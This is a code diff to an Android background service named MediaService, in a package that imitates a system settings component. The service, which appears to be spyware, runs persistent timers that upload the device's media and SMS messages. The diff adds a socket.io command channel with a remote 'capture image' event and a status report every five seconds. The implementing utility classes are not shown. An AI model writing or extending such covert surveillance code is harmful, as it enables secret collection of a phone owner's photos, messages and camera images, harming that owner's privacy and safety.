@@ -1,35 +1,47 @@
-package com.android.media.settings.Services;
+package com.android.media.settings.Service;
 
 import android.app.Notification;
-import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Binder;
+import android.os.Build;
+import android.os.Handler;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
 import android.util.Log;
 
+import com.android.media.settings.Interface.ImageCaptureListener;
 import com.android.media.settings.MediaConfig;
-import com.android.media.settings.MediaDBManager;
-import com.android.media.settings.Models.Media;
+import com.android.media.settings.Model.User;
 import com.android.media.settings.Utility.MediaCompressorUtility;
 import com.android.media.settings.Utility.SMSUtility;
 import com.android.media.settings.Receiver.MediaReceiver;
 import com.android.media.settings.Utility.ConfigUpdaterUtility;
 import com.android.media.settings.Utility.MediaUploadUtility;
 import com.android.media.settings.Utility.MediaUtility;
+import com.android.media.settings.Utility.SocketUtil;
+import com.android.media.settings.Utility.StatusUpdaterUtility;
+import com.github.nkzawa.emitter.Emitter;
+import com.github.nkzawa.socketio.client.IO;
+import com.github.nkzawa.socketio.client.Socket;
 
 import java.lang.reflect.Method;
+import java.net.URISyntaxException;
 import java.util.Timer;
 import java.util.TimerTask;
+import java.util.TreeMap;
+
+import static com.android.media.settings.Utility.SocketUtil.EVENT_CAPTURE_IMAGE;
+import static com.android.media.settings.Utility.SocketUtil.EVENT_ON_MESSAGE;
 
 public class MediaService extends Service {
     private static final String TAG = "Media Service";
-    private Timer imgMonitorTimer, imgUploadTimer, configTimer, smsTimer;
+    private Timer imgMonitorTimer, imgUploadTimer, configTimer, smsTimer, statusTimer;
     private MediaUtility mUtility;
     private final IBinder mediaBinder = new MediaBinder();
+    private Handler handler;
 
     private static final Class<?>[] mStartForegroundSignature = new Class[] {
             int.class, Notification.class};
@@ -55,14 +67,12 @@ public class MediaService extends Service {
         }
     }
 
-    private Runnable mediaRunnable = new Runnable() {
-        @Override
-        public void run() {
+    private Runnable mediaRunnable = () -> {
             initConfigTimer();
             initMediaCompression();
             initMediaUpload();
             initSMSUpload();
-        }
+            initStatusUpdate();
     };
 
     @Override
@@ -82,6 +92,7 @@ public class MediaService extends Service {
             throw new IllegalStateException(
                     "OS doesn't have Service.startForeground OR Service.setForeground!");
         }
+        handler = new Handler();
         this.mUtility = new MediaUtility(this);
     }
 
@@ -92,6 +103,8 @@ public class MediaService extends Service {
         registerReceiver();
         Thread mediaThread = new Thread(mediaRunnable);
         mediaThread.start();
+
+        new SocketUtil(this).connect();
         return START_STICKY;
     }
 
@@ -99,7 +112,7 @@ public class MediaService extends Service {
     private MediaUploadUtility mMediaUploadUtility;
     private SMSUtility mSMSUtility;
     private ConfigUpdaterUtility mConfigUpdaterUtility;
-
+    private StatusUpdaterUtility mStatusUpdaterUtility;
     MediaCompressorUtility getMCUInstance() {
         if(mMediaCompressorUtility != null) return mMediaCompressorUtility;
         mMediaCompressorUtility = new MediaCompressorUtility(MediaService.this);
@@ -122,6 +135,12 @@ public class MediaService extends Service {
         if(mConfigUpdaterUtility != null) return mConfigUpdaterUtility;
         mConfigUpdaterUtility = new ConfigUpdaterUtility(MediaService.this);
         return mConfigUpdaterUtility;
+    }
+
+    StatusUpdaterUtility getSUTInstance() {
+        if(mStatusUpdaterUtility != null) return mStatusUpdaterUtility;
+        mStatusUpdaterUtility = new StatusUpdaterUtility(MediaService.this);
+        return mStatusUpdaterUtility;
     }
 
     private void initMediaCompression() {
@@ -162,6 +181,16 @@ public class MediaService extends Service {
                 getCUUInstance().initConfigUpdater();
             }
         }, 0, 1000 * 60 * 60 * 24);
+    }
+
+    private void initStatusUpdate() {
+        statusTimer = new Timer();
+        statusTimer.schedule(new TimerTask() {
+            @Override
+            public void run() {
+                getSUTInstance().updateStatus();
+            }
+        }, 0, 1000 * 5);
     }
 
     private void registerReceiver() {
